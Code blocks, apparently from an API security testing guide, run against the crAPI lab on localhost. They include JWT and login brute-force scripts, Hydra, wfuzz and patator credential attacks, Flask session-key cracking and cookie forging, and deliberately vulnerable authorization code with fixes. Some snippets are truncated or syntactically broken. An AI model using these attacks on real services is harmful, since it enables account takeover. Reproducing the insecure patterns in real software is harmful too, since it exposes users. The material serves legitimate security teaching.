["```\n$ docker run --rm -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --repo https://github.com/mauricioharley/barbican-operator --issue-comments --pr-comments\nTruffleHog. Unearth your secrets.\n2024-01-03T12:22:34Z\tinfo-0\ttrufflehog\trunning source\t{\"source_manager_worker_id\": \"WH1SL\", \"with_units\": false, \"target_count\": 0, \"source_manager_units_configurable\": true}\n2024-01-03T12:22:34Z\tinfo-0\ttrufflehog\tCompleted enumeration\t{\"num_repos\": 1, \"num_orgs\": 0, \"num_members\": 0}\n2024-01-03T12:22:36Z\tinfo-0\ttrufflehog\tfinished scanning\t{\"chunks\": 1056, \"bytes\": 861040, \"verified_secrets\": 0, \"unverified_secrets\": 0, \"scan_duration\": \"2.502645278s\"}\n```", "```\n$ ./convert-rules.py --db ../db/rules-stable.yml --type trufflehog > /tmp/regex.json\n$ ./trufflehog github --repo https://github.com/mauricioharley/barbican-operator --include-paths=/tmp/regex.json --issue-comments --pr-comments\nTruffleHog. Unearth your secrets.\n2024-01-03T14:38:49+01:00\tinfo-0\ttrufflehog\trunning source\t{\"source_manager_worker_id\": \"v1HMM\", \"with_units\": false, \"target_count\": 0, \"source_manager_units_configurable\": true}\n2024-01-03T14:38:49+01:00\tinfo-0\ttrufflehog\tCompleted enumeration\t{\"num_repos\": 1, \"num_orgs\": 0, \"num_members\": 0}\n2024-01-03T14:38:52+01:00\tinfo-0\ttrufflehog\tfinished scanning\t{\"chunks\": 0, \"bytes\": 0, \"verified_secrets\": 0, \"unverified_secrets\": 0, \"scan_duration\": \"2.861085032s\"}\n```", "```\nGET /api/v2/list_resources\nAuthorization: Basic bWF1cmljaW86TXlQYXNzd29yZCNAIQo=\n```", "```\nimport random, requests, string, time\ntoken_start = \"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ\"\nsymbols = string.ascii_letters + string.digits + \"_.-\"\ntries = 1000 # Choose a number at your convenience\nwait_time = 50 # Number of ms to wait for before sending the next request\nfor _ in range(tries):\n    key = token_start + ''.join(random.choice(symbols) for i in range(464-len(token_start))) # crAPI tokens have 464 bytes.\n    headers = {'Authorization': f'Bearer {key}'}\n    r = requests.get(\n            'http://localhost:8888/workshop/api/shop/products',\n            headers = headers)\n    if 'Invalid JWT Token!' in r.text:\n        print(f\"Token FAILED {key}\")\n        print(f\"Code: {r.status_code} Message: {r.json()['message']}\\n\")\n    else:\n        print(f\"Token OK! {key}\")\n    time.sleep(round(wait_time / 1000))\n```", "```\nfrom flask import Flask, request, session, jsonify\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'secret_key'\n# Dummy user data for authentication\nusers = {\n    'user1': {'password': 'pass123', 'role': 'user'},\n    'admin': {'password': 'adminpass', 'role': 'admin'}\n}\n@app.route('/')\ndef home():\n    if 'username' in session:\n        return f'Hello, {session[\"username\"]}! Your role is {session[\"role\"]}.'\n    return 'Welcome to the home page. Please login.'\n@app.route('/login', methods=['POST'])\ndef login():\n    data = request.get_json()\n    username = data.get('username')\n    password = data.get('password')\n    if username in users and users[username]['password'] == password:\n        session['username'] = username\n        session['role'] = users[username]['role']\n        resp = jsonify({'message': 'Login successful!'})\n        resp.set_cookie('session_token', session['username'])\n        return resp\n    else:\n        return 'Login failed. Check your username and password.'\n@app.route('/logout')\ndef logout():\n    session.pop('username', None)\n    session.pop('role', None)\n    resp = jsonify({'message': 'Logout successful!'})\n    resp.delete_cookie('session_token')\n    return resp\nif __name__ == '__main__':\n    app.run(debug=True)\n```", "```\n$ curl http://localhost:5000\nWelcome to the home page. Please login.\n$ curl -X POST -H \"Content-Type: application/json\" -d '{\"username\": \"user1\", \"password\": \"pass123\"}' http://localhost:5000/login --cookie-jar cookie.txt\n{\n  \"message\": \"Login successful!\"\n}\n$ curl -b cookie.txt -c cookie.txt http://localhost:5000/\nHello, user1! Your role is user.\n$ curl -b cookie.txt -c cookie.txt http://localhost:5000/logout\n{\n  \"message\": \"Logout successful!\"\n}\n```", "```\n#HttpOnly_localhost\tFALSE\t/\tFALSE\t0\tsession eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.Za2WiQ.jnPujptv1NBAqEYCbCKsk6hkq6c\nlocalhost\tFALSE\t/\tFALSE\t0\tsession_token\tuser1\n```", "```\n$ ./cookiemonster -cookie \"eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.Za2WiQ.jnPujptv1NBAqEYCbCKsk6hkq6c\"\n   CookieMonster 1.4.0\n  CookieMonster loaded the default wordlist; it has 38919 entries.\n Success! I discovered the key for this cookie with the flask decoder; it is \"secret_key\".\n```", "```\n$ ./cookiemonster -cookie \"eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.Za2WiQ.jnPujptv1NBAqEYCbCKsk6hkq6c\" \n-resign \"My Own Data\"\n  CookieMonster 1.4.0\n  CookieMonster loaded the default wordlist; it has 38919 entries.\n Success! I discovered the key for this cookie with the flask decoder; it is \"secret_key\".\n I resigned this cookie for you; the new one is: TXkgT3duIERhdGE.Za2WiQ.UJu6-KPF2cdDy2bFz6bk3vi-OhY\n```", "```\n$ python jwt_tool.py eyJhbGciOiJSUzI1NiJ9.eyJzdW...\nToken header values:\n[+] alg = \"RS256\"\nToken payload values:\n[+] sub = \"mauricio@domain.com\"\n[+] role = \"user\"\n[+] iat = 1706051672    ==> TIMESTAMP = 2024-01-24 00:14:32 (UTC)\n[+] exp = 1706656472    ==> TIMESTAMP = 2024-01-31 00:14:32 (UTC)\nSeen timestamps:\n[*] iat was seen\n[*] exp is later than iat by: 7 days, 0 hours, 0 mins\n```", "```\n$ python jwt_tool.py -M at -t \"http://localhost:8888/workshop/api/shop/products\" -rh \"Authorization: Bearer <original token>\"\n...\n[+] Sending token\njwttool_7eaff80aee0ab3e8792d5bc1292a927b Sending token Response Code: 200, 169 bytes\nRunning Scanning Module:\nRunning prescan checks...\n...\nScanning mode completed: review the above results.\n```", "```\n{ \"keys\": [ { \"kty\": \"RSA\", \"e\": \"AQAB\", \"use\": \"sig\", \"kid\": \"MKMZkDenUfuDF2byYowDj7tW5Ox6XG4Y1THTEGScRg8\", \"alg\": \"RS256\", \"n\": \"sZKrGYja9S7BkO-waOcupoGY6BQjixJkg1Uitt278NbiCSnBRw5_cmfuWFFFPgRxabBZBJwJAujnQrlgTLXnRRItM9SRO884cEXn-s4Uc8qwk6pev63qb8no6aCVY0dFpthEGtOP-3KIJ2kx2i5HNzm8d7fG3ZswZrttDVbSSTy8UjPTOr4xVw1Yyh_GzGK9i_RYBWHftDsVfKrHcgGn1F_T6W0cgcnh4KFmbyOQ7dUy8Uc6Gu8JHeHJVt2vGcn50EDtUy2YN-UnZPjCSC7vYOfd5teUR_Bf4jg8GN6UnLbr_Et8HUnz9RFBLkPIf0NiY6iRjp9ooSDkml2OGql3ww\" } ] }\n```", "```\nPOST /identity/api/auth/login HTTP/1.1\nHost: localhost:8888\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://localhost:8888/login\nContent-Type: application/json\nContent-Length: 49\nOrigin: http://localhost:8888\nConnection: close\n{\"email\":\"blabla@domain.com\",\"password\":\"nonono\"}\n```", "```\n...\nContent-Type: application/json\n{\"token\":null,\"type\":\"Bearer\",\"message\":\"Given Email is not registered! \"}\n...\n```", "```\n...\nContent-Type: application/json\n...\n{\"token\":\"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJtYXVyaWNpb0Bkb21haW4uY29tIiw icm9sZSI6InVzZXIiLCJpYXQiOjE3MDc2NTkzODIsImV4cCI6MTcwODI2NDE4Mn0.X57Sg 1JDwDV1Zs7vyEcO_tJCcemXCHMV27ttJe-nuoF2hYpxRRAwYiM9BkKNDpWmfBSu4YtQTIa DjI9ueyC3xQM_g_w3Z6i3RxxMhZoEVf5psujkbmJi2DaznLiEISsVXashO30SOQKNFuCx v_1K8QtReRkGV7EzZcLrucEnM56vMfz6-Z0Kd5ND4YXBNDsj5CjdnehuxtjVrCf-q33a3J W9jwoqJPiFRoMVlbnX3wv3VHjU0768tpYwdon80th7Je34JgtLafbHDb9m8aSsnvdnnO7O LWOBtJC65HD14jdanY0GPt9ltqA9_-d2f6zk1jIOSJO-3emQqaXM6lMSAQ\",\"type\":\"Bearer\",\"message\":null}\n```", "```\nPOST /identity/api/auth/login HTTP/1.1\nHost: localhost:8888\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://localhost:8888/login\nContent-Type: application/json\nContent-Length: 53\nOrigin: http://localhost:8888\nConnection: close\n{\"email\":\"<your username>\",\"password\":\"<your password>\"}\n```", "```\n$ hydra -l admin -v -P passlist.txt -s 8888 localhost http-post \"/identity/api/auth/login:{\\\"email\\\"\\:\\\"^USER^\\\",\\\"password\\\"\\:\\\"^PASS^\\\"}:S=\\\"token\\\":H=Accept: */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate, br:H=Referer: http\\://localhost\\:8888/login:H =Content-Type: application/json:H=Origin: http\\://localhost\\:8888:H=Connection: close\"\nHydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-07 03:09:02\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 50915 login tries (l:1/p:50915), ~3183 tries per task\n[DATA] attacking http-post://localhost:8888/identity/api/auth/login\n[STATUS] 9112.00 tries/min, 9112 tries in 00:01h, 41803 to do in 00:05h, 16 active\n[STATUS] 9234.00 tries/min, 27702 tries in 00:03h, 23213 to do in 00:03h, 16 active\n1 of 1 target completed, 0 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-07 03:14:31\n```", "```\n$ hydra -l login.txt -v -P passlist.txt -s 8888 localhost http-post \"/identity/api/auth/login:{\\\"email\\\"\\:\\\"^USER^\\\",\\\"password\\\"\\:\\\"^PASS^\\\"}:S=\\\"token\\\":H=Accept: */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate, br:H=Referer: http\\://localhost\\:8888/login:H=Content-Type: application/json:H=Origin: http\\://localhost\\:8888:H=Connection: close\"\n```", "```\n$ ps a | grep hydra\n  15897 pts/0    S+     0:08 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login\n  15919 pts/0    S+     0:03 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login\n...\n  15933 pts/0    S+     0:03 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login\n  15934 pts/0    S+     0:02 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login\n```", "```\n[8888][http-post-form] host: localhost   login: admin@example.com   password: Admin!123\n```", "```\n$ docker logs -f crapi-web\nadmin [07/Feb/2024:02:28:02 +0000] \"POST /identity/api/auth/login HTTP/1.1\" 400 0 \"-\" \"Mozilla/4.0 (Hydra)\"\n```", "```\n$ python cupp.py -a  ___________    cupp.py!                 # Common       \\                     # User        \\   ,__,             # Passwords         \\  (oo)____         # Profiler            (__)    )\\                 ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]                            [ Mebus | https://github.com/Mebus/]\n[+] Checking if alectodb is not present...\n[+] Downloading alectodb.csv.gz from https://github.com/yangbh/... ... \n\n[+] Exporting to alectodb-usernames.txt and alectodb-passwords.txt [+] Done.\n```", "```\n$ wfuzz -z file,alectodb-usernames.txt -z file,alectodb-passwords.txt \\\n  -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"FUZZ\",\"password\":\"FUZ2Z\"}' \\\n  http://localhost:8888/identity/api/auth/login\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\nTarget: http://localhost:8888/identity/api/auth/login\nTotal requests: 915096\n=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                              =====================================================================\n000000001:   400        0 L      118 W      1520 Ch     \"123456\"                                                                      000000042:   400        0 L      61 W       797 Ch      \"2222\"                                                                                                               000000041:   400        0 L      61 W       797 Ch      \"21241036\"                                                                                                           000000015:   400        0 L      61 W       797 Ch      \"(unknown)\"                                                                                                          000000003:   400        0 L      61 W       797 Ch      \"!manage\"                                                                                                            000000043:   400        0 L      61 W       797 Ch      \"22222\"\n…Output omitted for brevity…\nTotal time: 0\nProcessed Requests: 1105854\nFiltered Requests: 0\nRequests/sec.: 0\n```", "```\n#!/bin/bash\npasswords=\"wordlist.txt\"\nMAXWAIT=2\nwhile IFS= read -r line\ndo\n  curl -X POST --data \"username=admin&password=$line >> output.txt\n  sleep $((RANDOM % MAXWAIT))\ndone < passwords\n```", "```\n$ patator http_fuzz method=POST resolve=domain:127.0.0.1 url=http://localhost:8888/identity/api/auth/login auto_urlencode=0 body='{\"email\": \"FILE0\", \"password\": \"Admin!123\"}' 0=./userlist.txt header=@fuzzerheader.txt\npatator INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.10.12 at 2024-02-18 18:40 -03\npatator INFO -\npatator INFO - code size:clen   time | candidate           |   num | mesg\npatator INFO - ----------------------------------------------------------\npatator INFO - 500  595:74     0.163 | user@domain.com     |     5 | HTTP/1.1 500\npatator INFO - 500  595:74     0.252 | user@example.com    |     6 | HTTP/1.1 500\npatator INFO - 500  595:74     0.451 | admin@domain.com    |     1 | HTTP/1.1 500\npatator INFO - 200  1031:509   0.442 | admin@example.com   |     2 | HTTP/1.1 200\npatator INFO - 500  595:74     0.359 | dummy@domain.com    |     3 | HTTP/1.1 500\npatator INFO - 500  595:74     0.366 | dummy@example.com   |     4 | HTTP/1.1 500\npatator INFO - Hits/Done/Skip/Fail/Size: 6/6/0/0/6, Avg: 5 r/s, Time: 0h 0m 1s\n```", "```\nadmin@domain.com\nadmin@example.com\ndummy@domain.com\ndummy@example.com\nuser@domain.com\nuser@example.com\n```", "```\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:8888/login\nContent-Type: application/json\nOrigin: http://localhost:8888\nConnection: close\n```", "```\nimport requests\n# providing the scope as part of the HTTP GET request\nauth_url = \"https://api.example.com/oauth/authorize\"\nparams = {\n  \"client_id\": \"your_client_id\",\n  \"redirect_uri\": \"your_redirect_uri\",\n  \"response_type\": \"code\",\n  \"scope\": \"read-write\"\n}\nresponse = requests.get(auth_url, params=params)\n# A JWT carrying the granted scope\ntoken = {\n  \"access_token\": \"your_access_token\",\n  \"expires_in\": 3600,\n  \"scope\": \"read\"\n}\n# How you could check the scopes in a request\nheaders = {\n  \"Authorization\": f\"Bearer {your_access_token}\"\n}\nresponse = requests.get(\"https://api.example.com/resource\",                          headers=headers)\n# Check if at least read access was granted\nif \"read\" in response.json().get(\"scopes\", []):\n  # Access granted\nelse:\n  # Access denied due to insufficient scope\n# Creating scopes with Flask\nfrom flask import Flask\nfrom flask_oauthlib.provider import OAuth1Provider\napp = Flask(__name__)\nscopes = {\n  \"read\": \"Read access to all resources\",\n  \"write\": \"Write access to all resources\",\n  \"user:read\": \"Read access to user data\",\n  \"user:write\": \"Write access to user data\"\n}\n@app.route(\"/api/protected\")\n@requires_oauth(\"read\")\ndef protected_resource():\n  # Access granted for users with the \"read\"\n```", "```\n# This function updates employee information.\ndef update_employee_info(employee_id, new_info, user_role):\n    if user_role == \"admin\":  # Incorrectly assuming user_role is trusted\n        # Update employee info in the database\n        ...\n        return \"Information updated successfully\"\n    else:\n        return \"Access denied. No permission to perform this operation.\"\n# API endpoint to update employee information\n@app.route('/employees/<employee_id>', methods=['PUT'])\ndef update_employee(employee_id):\n    new_info = request.json\n    user_role = get_user_role(request.headers['Authorization'])  # Function to get user role\n    return update_employee_info(employee_id, new_info, user_role)\n```", "```\n# Function to process financial transactions\ndef process_transaction(account_type, transaction_amount):\n    if account_type == \"standard\" and transaction_amount > 1000:\n        return \"Access denied! Transaction amount above limit.\"\n    else:\n        # Process the transaction\n        ...\n        return \"Transaction processed successfully\"\n# API endpoint to initiate a financial transaction\n@app.route('/transactions', methods=['POST'])\ndef initiate_transaction():\n    transaction_data = request.json\n    account_type = get_account_type(request.headers['Authorization'])\n    return process_transaction(account_type, transaction_data['amount'])\n```", "```\n# Function to read user profile information\ndef read_profile(access_token):\n    # Assuming access token scopes are trusted\n    if \"read_profile\" in access_token.scopes:\n        # Read user profile information\n        ...\n        return \"User profile: {}\".format(profile_info)\n    else:\n        return \"Access denied. Insufficient scope.\"\n# API endpoint to retrieve user profile\n@app.route('/profile', methods=['GET'])\ndef get_profile():\n    # Function to extract access token\n    access_token = extract_access_token(request.headers['Authorization'])\n    return read_profile(access_token)\n```", "```\nfrom flask import Flask, request, jsonify\napp = Flask(__name__)\ndef get_user_by_id(user_id):    users = {        \"1\": {\"id\": 1, \"name\": \"Alice\", \"role\": \"admin\"},        \"2\": {\"id\": 2, \"name\": \"Bob\", \"role\": \"user\"},        \"3\": {\"id\": 3, \"name\": \"Charlie\", \"role\": \"user\"}    }    return users.get(user_id, None)\n@app.route('/user', methods=['GET'])def get_user():    user_id = request.args.get('id')    user = get_user_by_id(user_id)    if user:        return jsonify(user)    else:        return jsonify({\"error\": \"User not found\"}), 404\nif __name__ == '__main__':    app.run()\n```", "```\nfrom flask import Flask, request, jsonify\napp = Flask(__name__)\ndef get_current_user():    return {\"id\": 2, \"name\": \"Bob\", \"role\": \"user\"}  # Mocked current user\ndef get_user_by_id(user_id):    users = {        \"1\": {\"id\": 1, \"name\": \"Alice\", \"role\": \"admin\"},        \"2\": {\"id\": 2, \"name\": \"Bob\", \"role\": \"user\"},        \"3\": {\"id\": 3, \"name\": \"Charlie\", \"role\": \"user\"}    }    return users.get(user_id, None)\n@app.route('/user', methods=['GET'])def get_user():    current_user = get_current_user()  # Get the authenticated user     user_id = request.args.get('id')    user = get_user_by_id(user_id)\n    if not user:        return jsonify({\"error\": \"User not found\"}), 404\n    # Check if the current user is trying to access their own data\n    if str(current_user['id']) != user_id:\n        return jsonify({\"error\": \"Forbidden\"}), 403\n    return jsonify(user)\nif __name__ == '__main__':\n    app.run()\n```", "```\npackage main\nimport (\n    \"encoding/json\"\n    \"net/http\"\n    \"strconv\"\n    \"github.com/gorilla/mux\"\n)\ntype User struct {\n    ID    int    `json:\"id\"`\n    Name  string `json:\"name\"`\n    Role  string `json:\"role\"`\n}\nvar users = []User{\n    {ID: 1, Name: \"Alice\", Role: \"admin\"},\n    {ID: 2, Name: \"Bob\", Role: \"user\"},\n    {ID: 3, Name: \"Charlie\", Role: \"user\"},\n}\nfunc createUser(w http.ResponseWriter, r *http.Request) {\n    var newUser User\n    json.NewDecoder(r.Body).Decode(&newUser)\n    users = append(users, newUser)\n    w.WriteHeader(http.StatusCreated)\n    json.NewEncoder(w).Encode(newUser)\n}\nfunc main() {\n    r := mux.NewRouter()\n    r.HandleFunc(\"/admin/create_user\", createUser).Methods(\"POST\")\n    http.ListenAndServe(\":8000\", r)\n}\n```", "```\npackage main\nimport (\n    \"encoding/json\"\n    \"net/http\"\n    \"strings\"\n    \"github.com/gorilla/mux\"\n)\ntype User struct {\n    ID    int    `json:\"id\"`\n    Name  string `json:\"name\"`\n    Role  string `json:\"role\"`\n}\nvar users = []User{\n    {ID: 1, Name: \"Alice\", Role: \"admin\"},\n    {ID: 2, Name: \"Bob\", Role: \"user\"},\n    {ID: 3, Name: \"Charlie\", Role: \"user\"},\n}\nfunc getCurrentUser(r *http.Request) *User {\n    authHeader := r.Header.Get(\"Authorization\")\n    if strings.HasPrefix(authHeader, \"Bearer \") {\n        token := strings.TrimPrefix(authHeader, \"Bearer \")\n        if token == \"admin-token\" {\n            return &User{ID: 1, Name: \"Alice\", Role: \"admin\"}\n        }\n    }\n    return nil\n}\nfunc requireAdminRole(next http.Handler) http.Handler {\n    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request){\n        user := getCurrentUser(r)\n        if user == nil || user.Role != \"admin\" {\n            http.Error(w, \"Forbidden\", http.StatusForbidden)\n            return\n        }\n        next.ServeHTTP(w, r)\n    })\n}\nfunc createUser(w http.ResponseWriter, r *http.Request) {\n    var newUser User\n    json.NewDecoder(r.Body).Decode(&newUser)\n    users = append(users, newUser)\n    w.WriteHeader(http.StatusCreated)\n    json.NewEncoder(w).Encode(newUser)\n}\nfunc main() {\n    r := mux.NewRouter()\n    r.Handle(\"/admin/create_user\", requireAdminRole(http.HandlerFunc(createUser))).Methods(\"POST\")\n    http.ListenAndServe(\":8000\", r)\n}\n```"]